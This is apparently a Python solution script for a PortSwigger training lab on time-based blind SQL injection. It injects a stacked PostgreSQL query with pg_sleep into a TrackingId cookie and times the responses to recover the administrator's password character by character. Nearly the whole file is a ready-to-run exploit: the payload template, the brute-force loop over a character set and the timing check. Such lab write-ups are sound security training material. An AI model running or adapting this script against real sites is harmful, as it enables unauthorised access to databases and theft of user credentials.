# Lab 15 — Blind SQL Injection: Time Delays and Information Retrieval
# PortSwigger: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
#
# Vulnerability: TrackingId cookie
# Aim:           Extract the administrator password using response time as the signal
#
# DB: PostgreSQL
#
# Technique:
#   Inject a CASE that calls pg_sleep(DELAY) only when the condition is TRUE.
#   Measure response time — delay = TRUE, instant = FALSE.
#
#   Stacked query (;) is used here because the || concatenation approach
#   did not work for the CASE expression in this lab. Must be URL-encoded.
#
#   ' ; SELECT CASE WHEN (username='administrator' AND SUBSTR(password,{i},1)='{char}')
#              THEN pg_sleep(DELAY) ELSE NULL END FROM users--
#
# Usage: python lab15.py <url>

import sys
import time
import requests
import urllib3
from proxies import proxies
from sqli_utils import banner, section

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PASSWORD_LENGTH = 20
CHARSET         = "abcdefghijklmnopqrstuvwxyz0123456789"
DELAY_SECONDS   = 8    # Use ≥5s — lower values risk false positives from network latency


if __name__ == "__main__":
    banner()
    section("LAB 15 — BLIND SQLi: TIME-BASED EXTRACTION (POSTGRESQL)")

    if len(sys.argv) != 2:
        print("  Usage: python lab15.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = requests.Session()
    session.verify   = False
    session.proxies  = proxies

    session.get(url)
    tracking_id = session.cookies.get("TrackingId")

    print(f"\n  TrackingId: {tracking_id}")
    print(f"  Delay threshold: {DELAY_SECONDS}s | Password length: {PASSWORD_LENGTH}\n")

    password = ""

    for i in range(1, PASSWORD_LENGTH + 1):
        for char in CHARSET:
            # Stacked query: evaluates pg_sleep only when char matches
            # requests will URL-encode the payload automatically when passed as a cookie value
            payload = (
                f"{tracking_id}' ; SELECT CASE WHEN "
                f"(username='administrator' AND SUBSTR(password,{i},1)='{char}') "
                f"THEN pg_sleep({DELAY_SECONDS}) ELSE NULL END FROM users--"
            )

            start    = time.time()
            session.get(url, cookies={"TrackingId": payload})
            elapsed  = time.time() - start

            if elapsed >= DELAY_SECONDS:
                password += char
                sys.stdout.write(f"\r  ★  Found so far: {password}")
                sys.stdout.flush()
                break
            else:
                sys.stdout.write(f"\r  ⟳  Position {i}: trying '{char}' ({elapsed:.1f}s)  ")
                sys.stdout.flush()

    print(f"\n\n  ★  Administrator password: {password}")
